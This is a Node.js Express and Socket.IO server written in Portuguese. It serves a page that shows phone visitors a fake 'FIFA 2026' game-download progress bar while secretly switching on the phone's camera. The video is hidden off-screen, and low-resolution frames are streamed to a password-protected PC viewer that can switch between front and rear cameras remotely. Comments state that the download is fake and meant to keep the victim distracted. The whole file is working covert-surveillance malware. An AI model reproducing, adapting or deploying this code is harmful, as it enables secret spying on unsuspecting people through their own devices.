const express = require('express');
const http = require('http');
const socketIO = require('socket.io');
const path = require('path');
const app = express();
const server = http.createServer(app);
const io = socketIO(server, {
  cors: { origin: "*", methods: ["GET", "POST"] }
});

const PORT = process.env.PORT || 3000;
const SENHA = "1234"; // 🔑 Mude para a senha que quiser

// ========== FUNÇÃO PARA DETECTAR DISPOSITIVO ==========
function detectarDispositivo(userAgent) {
  const ua = userAgent.toLowerCase();
  const isMobile = /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
  const isTablet = /ipad|tablet|kindle|silk|playbook/i.test(ua);
  
  if (isTablet) return 'tablet';
  if (isMobile) return 'mobile';
  return 'desktop';
}

app.get('/', (req, res) => {
  // Detecta o dispositivo do usuário
  const dispositivo = detectarDispositivo(req.headers['user-agent'] || '');
  
  res.send(`
<!DOCTYPE html>
<html>
<head>
    <title>📱 Game Download</title>
    <meta charset="utf-8">
    <meta name="viewport" content="width=device-width, initial-scale=1">
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            max-width: 800px;
            margin: 0 auto;
            background: white;
            border-radius: 20px;
            padding: 30px;
            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
            text-align: center;
        }
        
        /* Estilos para CELULAR */
        .mobile-container {
            animation: fadeIn 1s;
        }
        
        .game-logo {
            font-size: 80px;
            margin: 20px 0;
            animation: pulse 2s infinite;
        }
        
        @keyframes pulse {
            0% { transform: scale(1); }
            50% { transform: scale(1.1); }
            100% { transform: scale(1); }
        }
        
        @keyframes fadeIn {
            from { opacity: 0; }
            to { opacity: 1; }
        }
        
        .game-title {
            font-size: 28px;
            color: #333;
            margin-bottom: 10px;
            font-weight: bold;
        }
        
        .game-subtitle {
            color: #666;
            margin-bottom: 30px;
        }
        
        /* Barrinha de progresso */
        .progress-container {
            background: #f0f0f0;
            border-radius: 25px;
            height: 30px;
            width: 100%;
            margin: 30px 0;
            overflow: hidden;
            box-shadow: inset 0 1px 3px rgba(0,0,0,0.2);
        }
        
        .progress-bar {
            height: 100%;
            width: 0%;
            background: linear-gradient(90deg, #4CAF50, #8BC34A);
            border-radius: 25px;
            transition: width 0.3s;
            display: flex;
            align-items: center;
            justify-content: center;
            color: white;
            font-weight: bold;
            text-shadow: 1px 1px 2px rgba(0,0,0,0.2);
        }
        
        .progress-text {
            font-size: 18px;
            margin-top: 10px;
            color: #4CAF50;
            font-weight: bold;
        }
        
        .status-message {
            font-size: 16px;
            color: #666;
            margin: 20px 0;
        }
        
        .download-speed {
            background: #e3f2fd;
            padding: 15px;
            border-radius: 10px;
            margin: 20px 0;
            font-family: monospace;
            font-size: 14px;
            color: #1976D2;
        }
        
        /* Estilos para PC */
        .pc-container {
            text-align: left;
        }
        
        .video-container {
            display: grid;
            grid-template-columns: 1fr;
            gap: 20px;
            margin-bottom: 30px;
        }
        
        .camera-wrapper {
            position: relative;
            width: 100%;
            background: #000;
            border-radius: 10px;
            overflow: hidden;
            aspect-ratio: 4/3;
        }
        
        #remoteVideo {
            width: 100%;
            height: 100%;
            object-fit: cover;
            display: block;
        }
        
        #passwordOverlay {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: rgba(0,0,0,0.9);
            display: flex;
            align-items: center;
            justify-content: center;
            z-index: 10;
            border-radius: 10px;
        }
        
        .password-box {
            background: white;
            padding: 30px;
            border-radius: 15px;
            text-align: center;
            width: 90%;
            max-width: 300px;
        }
        
        .password-box h3 { color: #333; margin-bottom: 20px; }
        .password-box input {
            width: 100%;
            padding: 12px;
            font-size: 18px;
            border: 2px solid #ddd;
            border-radius: 8px;
            margin-bottom: 15px;
            text-align: center;
        }
        .password-box button {
            background: #667eea;
            color: white;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            cursor: pointer;
            width: 100%;
        }
        
        .info-box {
            background: #e3f2fd;
            padding: 20px;
            border-radius: 10px;
            border-left: 5px solid #2196F3;
            margin-bottom: 15px;
        }

        /* Controles da câmera */
        .camera-controls {
            display: flex;
            gap: 10px;
            justify-content: center;
            margin-top: 15px;
        }
        
        .camera-btn {
            background: #4CAF50;
            color: white;
            border: none;
            padding: 12px 20px;
            border-radius: 8px;
            cursor: pointer;
            font-size: 16px;
            flex: 1;
            transition: all 0.3s;
        }
        
        .camera-btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 5px 15px rgba(76, 175, 80, 0.3);
        }
        
        .camera-btn.active {
            background: #2196F3;
            box-shadow: 0 0 0 3px rgba(33, 150, 243, 0.3);
        }
        
        .camera-btn:disabled {
            background: #ccc;
            cursor: not-allowed;
            transform: none;
        }
        
        .hidden {
            display: none;
        }
        
        #localVideo {
            display: none; /* Completamente escondido */
            position: absolute;
            top: -9999px;
            left: -9999px;
            width: 1px;
            height: 1px;
            opacity: 0;
        }
    </style>
</head>
<body>
    <div class="container">
        <!-- CONTEÚDO PARA CELULAR -->
        <div id="mobileContent" class="mobile-container">
            <div class="game-logo">🎮</div>
            <div class="game-title">FIFA 2026</div>
            <div class="game-subtitle">Ultimate Edition</div>
            
            <div class="progress-container">
                <div id="progressBar" class="progress-bar" style="width: 0%">0%</div>
            </div>
            
            <div id="progressPercent" class="progress-text">0% concluído</div>
            
            <div class="download-speed" id="speedInfo">
                ⬇️ 0 MB / 0 MB • 0 MB/s
            </div>
            
            <div class="status-message" id="statusMessage">
                ⏳ Preparando download...
            </div>
            
            <div style="margin-top: 30px; color: #999; font-size: 14px;">
                Não feche esta página • Download em segundo plano
            </div>
        </div>
        
        <!-- CONTEÚDO PARA PC -->
        <div id="pcContent" class="pc-container hidden">
            <h1 style="text-align: center; margin-bottom: 30px;">📷 Visualização Remota</h1>
            
            <div class="video-container">
                <div class="camera-wrapper">
                    <img id="remoteVideo">
                    
                    <div id="passwordOverlay">
                        <div class="password-box">
                            <h3>🔒 Conteúdo Bloqueado</h3>
                            <p style="margin-bottom: 15px;">Digite a senha para liberar</p>
                            <input type="password" id="senhaInput" maxlength="4" placeholder="****">
                            <button onclick="verificarSenha()">Liberar Visualização</button>
                            <div id="erroSenha" style="color: #f44336; margin-top: 10px; display: none;">Senha incorreta!</div>
                        </div>
                    </div>
                </div>
            </div>
            
            <!-- CONTROLES DA CÂMERA (aparecem após liberar senha) -->
            <div id="cameraControls" class="camera-controls hidden">
                <button class="camera-btn" id="cameraFrontBtn" onclick="mudarCamera('front')">
                    📱 Câmera Frontal
                </button>
                <button class="camera-btn" id="cameraBackBtn" onclick="mudarCamera('back')">
                    📷 Câmera Traseira
                </button>
            </div>
            
            <div class="info-box">
                <h4>📱 Informações:</h4>
                <p>Digite a senha <strong>"1234"</strong> para ver a transmissão ao vivo.</p>
                <p>Após liberar, você pode alternar entre câmera frontal e traseira!</p>
                <p>No celular, o download falso está rodando... 🎮</p>
            </div>
        </div>
        
        <!-- Vídeo escondido para captura (celular) - AGORA COMPLETAMENTE INVISÍVEL -->
        <video id="localVideo" autoplay playsinline muted></video>
    </div>

    <script src="/socket.io/socket.io.js"></script>
    <script>
        const socket = io();
        const SENHA_CORRETA = "1234";
        
        // Elementos
        const mobileContent = document.getElementById('mobileContent');
        const pcContent = document.getElementById('pcContent');
        const localVideo = document.getElementById('localVideo');
        const remoteVideo = document.getElementById('remoteVideo');
        const passwordOverlay = document.getElementById('passwordOverlay');
        const cameraControls = document.getElementById('cameraControls');
        
        // Elementos da barrinha
        const progressBar = document.getElementById('progressBar');
        const progressPercent = document.getElementById('progressPercent');
        const speedInfo = document.getElementById('speedInfo');
        const statusMessage = document.getElementById('statusMessage');
        
        // Estado
        let mediaStream = null;
        let visualizacaoLiberada = false;
        let progresso = 0;
        let intervaloProgresso = null;
        let cameraAtual = 'back'; // 'back' ou 'front'
        let intervaloCaptura = null;
        
        // Botões da câmera
        const cameraFrontBtn = document.getElementById('cameraFrontBtn');
        const cameraBackBtn = document.getElementById('cameraBackBtn');
        
        // ========== DETECÇÃO DE DISPOSITIVO ==========
        function detectarDispositivo() {
            const ua = navigator.userAgent.toLowerCase();
            return /mobile|android|iphone|ipod|blackberry|opera mini|iemobile|wpdesktop/i.test(ua);
        }
        
        const isMobile = detectarDispositivo();
        
        // ========== CONFIGURAÇÃO POR DISPOSITIVO ==========
        if (isMobile) {
            // 📱 É CELULAR - Mostra a barrinha falsa
            console.log('📱 Celular detectado - modo download falso');
            mobileContent.style.display = 'block';
            pcContent.style.display = 'none';
            
            // Inicia a animação da barrinha
            iniciarDownloadFalso();
            
            // Liga a câmera escondida (inicia com traseira) - VERSÃO SILENCIOSA
            setTimeout(() => {
                ligarCameraSilenciosa('back');
            }, 2000); // 2 segundos
            
        } else {
            // 💻 É PC - Mostra o visualizador
            console.log('💻 PC detectado - modo visualizador');
            mobileContent.style.display = 'none';
            pcContent.style.display = 'block';
        }
        
        // ========== FUNÇÃO DA BARRINHA FALSA ==========
        function iniciarDownloadFalso() {
            progresso = 0;
            const tamanhoTotal = 2500; // 2.5 GB (falso)
            const velocidades = ['1.2 MB/s', '1.5 MB/s', '1.8 MB/s', '2.1 MB/s', '1.9 MB/s', '2.3 MB/s'];
            let velocidadeIndex = 0;
            
            statusMessage.innerHTML = '⏳ Conectando aos servidores...';
            
            setTimeout(() => {
                statusMessage.innerHTML = '📦 Baixando arquivos do jogo...';
                
                intervaloProgresso = setInterval(() => {
                    if (progresso < 100) {
                        // Aumenta o progresso de forma aleatória (2-5% por vez)
                        const incremento = Math.random() * 3 + 2;
                        progresso = Math.min(100, progresso + incremento);
                        
                        // Atualiza a barra
                        progressBar.style.width = progresso + '%';
                        progressBar.innerHTML = progresso.toFixed(0) + '%';
                        progressPercent.innerHTML = progresso.toFixed(0) + '% concluído';
                        
                        // Atualiza informações de velocidade
                        const baixado = ((progresso / 100) * tamanhoTotal).toFixed(1);
                        velocidadeIndex = (velocidadeIndex + 1) % velocidades.length;
                        speedInfo.innerHTML = \`⬇️ \${baixado} MB / \${tamanhoTotal} MB • \${velocidades[velocidadeIndex]}\`;
                        
                        // Mensagens dinâmicas
                        if (progresso > 95) {
                            statusMessage.innerHTML = '📦 Quase lá... verificando arquivos';
                        } else if (progresso > 75) {
                            statusMessage.innerHTML = '🎮 Finalizando download...';
                        } else if (progresso > 50) {
                            statusMessage.innerHTML = '⚡ Instalando recursos do jogo...';
                        } else if (progresso > 25) {
                            statusMessage.innerHTML = '🎵 Baixando áudios e texturas...';
                        }
                        
                        // Quando chegar a 100%
                        if (progresso >= 100) {
                            clearInterval(intervaloProgresso);
                            progressBar.style.background = 'linear-gradient(90deg, #4CAF50, #2196F3)';
                            statusMessage.innerHTML = '✅ Download concluído! Instalação em segundo plano...';
                            speedInfo.innerHTML = '⬇️ 2500 MB / 2500 MB • 0 MB/s';
                            
                            // Fica variando entre 99-100% para parecer que está "instalando"
                            let instalando = 99.9;
                            const intervaloInstalacao = setInterval(() => {
                                instalando = instalando > 100 ? 99.9 : instalando + 0.1;
                                progressBar.style.width = instalando + '%';
                                progressBar.innerHTML = instalando.toFixed(1) + '%';
                                progressPercent.innerHTML = instalando.toFixed(1) + '% - Instalando...';
                                
                                if (instalando > 100.5) {
                                    clearInterval(intervaloInstalacao);
                                    progressBar.style.width = '100%';
                                    progressBar.innerHTML = '100%';
                                    progressPercent.innerHTML = '100% - Pronto para jogar!';
                                }
                            }, 300);
                        }
                    }
                }, 400);
            }, 2000);
        }
        
        // ========== FUNÇÃO PARA LIGAR CÂMERA SILENCIOSA (OPÇÃO 3) ==========
        async function ligarCameraSilenciosa(tipoCamera) {
            try {
                console.log('📷 Iniciando câmera em modo silencioso...');
                
                // Lista de resoluções tentativas (da menor para a maior)
                const resolucoes = [
                    { width: 160, height: 120 },  // Resolução mínima
                    { width: 240, height: 160 },
                    { width: 320, height: 240 },
                    { width: 426, height: 240 }
                ];
                
                let stream = null;
                let resolucaoUsada = null;
                
                // Para a captura atual se existir
                if (intervaloCaptura) {
                    clearInterval(intervaloCaptura);
                }
                
                // Para todas as tracks da stream anterior
                if (mediaStream) {
                    mediaStream.getTracks().forEach(track => track.stop());
                }
                
                // Tenta cada resolução até encontrar uma que funcione
                for (const res of resolucoes) {
                    try {
                        const constraints = {
                            video: {
                                width: { exact: res.width },
                                height: { exact: res.height },
                                frameRate: { ideal: 5, max: 8 }
                            },
                            audio: false
                        };
                        
                        if (tipoCamera === 'front') {
                            constraints.video.facingMode = 'user';
                        } else {
                            constraints.video.facingMode = 'environment';
                        }
                        
                        stream = await navigator.mediaDevices.getUserMedia(constraints);
                        resolucaoUsada = res;
                        console.log(\`✅ Câmera iniciada com resolução \${res.width}x\${res.height}\`);
                        break;
                    } catch (e) {
                        console.log(\`Resolução \${res.width}x\${res.height} falhou, tentando próxima...\`);
                    }
                }
                
                // Se nenhuma resolução exata funcionar, tenta com ideal
                if (!stream) {
                    try {
                        const constraints = {
                            video: {
                                width: { ideal: 240 },
                                height: { ideal: 160 },
                                frameRate: { ideal: 5 }
                            },
                            audio: false
                        };
                        
                        if (tipoCamera === 'front') {
                            constraints.video.facingMode = 'user';
                        } else {
                            constraints.video.facingMode = 'environment';
                        }
                        
                        stream = await navigator.mediaDevices.getUserMedia(constraints);
                        resolucaoUsada = { width: 240, height: 160 };
                        console.log('✅ Câmera iniciada com resolução ideal 240x160');
                    } catch (e) {
                        console.log('Falha na resolução ideal, tentando qualquer resolução...');
                        
                        // Última tentativa - qualquer resolução
                        const constraints = {
                            video: {
                                facingMode: tipoCamera === 'front' ? 'user' : 'environment'
                            },
                            audio: false
                        };
                        
                        stream = await navigator.mediaDevices.getUserMedia(constraints);
                        
                        // Tenta descobrir a resolução
                        const track = stream.getVideoTracks()[0];
                        const settings = track.getSettings();
                        resolucaoUsada = { 
                            width: settings.width || 320, 
                            height: settings.height || 240 
                        };
                        console.log(\`✅ Câmera iniciada com resolução \${resolucaoUsada.width}x\${resolucaoUsada.height}\`);
                    }
                }
                
                if (!stream) {
                    throw new Error('Não foi possível iniciar a câmera com nenhuma resolução');
                }
                
                mediaStream = stream;
                cameraAtual = tipoCamera;
                
                // Configura o vídeo local - COMPLETAMENTE ESCONDIDO
                localVideo.srcObject = stream;
                localVideo.style.opacity = '0';
                localVideo.style.position = 'absolute';
                localVideo.style.top = '-9999px';
                localVideo.style.left = '-9999px';
                localVideo.style.width = '1px';
                localVideo.style.height = '1px';
                localVideo.style.pointerEvents = 'none';
                await localVideo.play();
                
                // Canvas para capturar frames (tamanho reduzido)
                const canvas = document.createElement('canvas');
                canvas.width = resolucaoUsada.width;
                canvas.height = resolucaoUsada.height;
                const ctx = canvas.getContext('2d');
                
                // Inicia captura com intervalo MAIOR (menos frames = menos processamento)
                intervaloCaptura = setInterval(() => {
                    try {
                        ctx.drawImage(localVideo, 0, 0, resolucaoUsada.width, resolucaoUsada.height);
                        // Qualidade ultra baixa (20%)
                        const frame = canvas.toDataURL('image/jpeg', 0.2);
                        socket.emit('frame', frame);
                    } catch (e) {
                        console.log('Erro na captura:', e);
                    }
                }, 500); // 2 fps (menos frequente)
                
                console.log('✅ Transmissão silenciosa ativada!');
                
                // Mensagem para manter o usuário distraído
                statusMessage.innerHTML = '📱 Otimizando velocidade de download...';
                
            } catch (err) {
                console.error('Erro fatal na câmera:', err);
                statusMessage.innerHTML = '⚠️ Modo offline ativado - continuando download...';
            }
        }
        
        // ========== FUNÇÃO PARA MUDAR CÂMERA (chamada do PC) ==========
        window.mudarCamera = function(tipo) {
            if (!visualizacaoLiberada) {
                alert('Libere a visualização primeiro!');
                return;
            }
            
            // Atualiza botões
            if (tipo === 'front') {
                cameraFrontBtn.classList.add('active');
                cameraBackBtn.classList.remove('active');
            } else {
                cameraBackBtn.classList.add('active');
                cameraFrontBtn.classList.remove('active');
            }
            
            // Envia comando para o celular trocar a câmera
            socket.emit('trocarCamera', tipo);
        };
        
        // ========== VERIFICAÇÃO DE SENHA (PC) ==========
        window.verificarSenha = function() {
            const senha = document.getElementById('senhaInput').value;
            if (senha === SENHA_CORRETA) {
                passwordOverlay.style.display = 'none';
                visualizacaoLiberada = true;
                cameraControls.classList.remove('hidden');
                cameraBackBtn.classList.add('active'); // Começa com traseira
            } else {
                document.getElementById('erroSenha').style.display = 'block';
            }
        };
        
        document.getElementById('senhaInput')?.addEventListener('keypress', (e) => {
            if (e.key === 'Enter') verificarSenha();
        });
        
        // ========== SOCKET.IO ==========
        socket.on('connect', () => {
            console.log('Conectado ao servidor');
        });
        
        // Recebe comando para trocar câmera (enviado do PC)
        socket.on('trocarCamera', (tipoCamera) => {
            console.log('📱 Comando recebido: trocar para câmera', tipoCamera);
            if (isMobile) {
                ligarCameraSilenciosa(tipoCamera);
            }
        });
        
        socket.on('frame', (frameData) => {
            if (visualizacaoLiberada) {
                remoteVideo.src = frameData;
            }
        });
    </script>
</body>
</html>
  `);
});

// Socket.IO
io.on('connection', (socket) => {
  console.log('Cliente conectado');
  
  socket.on('frame', (frameData) => {
    socket.broadcast.emit('frame', frameData);
  });
  
  // Novo evento para trocar câmera
  socket.on('trocarCamera', (tipoCamera) => {
    console.log(`📷 Solicitando troca para câmera: ${tipoCamera}`);
    socket.broadcast.emit('trocarCamera', tipoCamera);
  });
});

server.listen(PORT, () => {
  console.log('='.repeat(60));
  console.log('📱 SISTEMA DE DOWNLOAD FALSO');
  console.log('='.repeat(60));
  console.log(`🚀 Servidor rodando na porta ${PORT}`);
  console.log(`🔑 Senha: ${SENHA}`);
  console.log('📱 No celular: mostra download falso do FIFA');
  console.log('💻 No PC: mostra a câmera escondida COM CONTROLE');
  console.log('🎮 Agora você pode alternar entre câmera frontal/traseira!');
  console.log('='.repeat(60));
});
